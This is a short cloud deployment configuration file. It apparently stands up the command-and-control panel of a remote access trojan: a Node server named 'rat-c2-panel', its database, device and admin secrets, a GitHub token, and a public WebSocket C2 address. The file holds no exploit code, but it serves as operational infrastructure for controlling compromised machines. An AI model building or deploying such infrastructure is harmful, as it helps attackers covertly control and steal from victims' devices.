services:
  - type: web
    name: rat-c2-panel
    runtime: node
    plan: free
    rootDir: backend
    buildCommand: |
      cd ../frontend && npm ci && npm run build
      cd ../backend && npm ci
    startCommand: node server.js
    healthCheckPath: /health
    envVars:
      - key: NODE_ENV
        value: production
      - key: PORT
        value: 3000
      - key: DATABASE_URL
        fromDatabase:
          name: rat-c2-db
          property: connectionString
      - key: JWT_SECRET
        generateValue: true
      - key: ADMIN_USERNAME
        value: admin
      - key: ADMIN_PASSWORD_HASH
        sync: false
      - key: DEVICE_SECRET
        sync: false
      - key: GH_TOKEN
        sync: false
      - key: GH_REPO
        value: uyrer/rat-project
      - key: PUBLIC_C2_URL
        value: wss://rat-c2-panel.onrender.com/ws

databases:
  - name: rat-c2-db
    plan: free
    databaseName: rat_c2
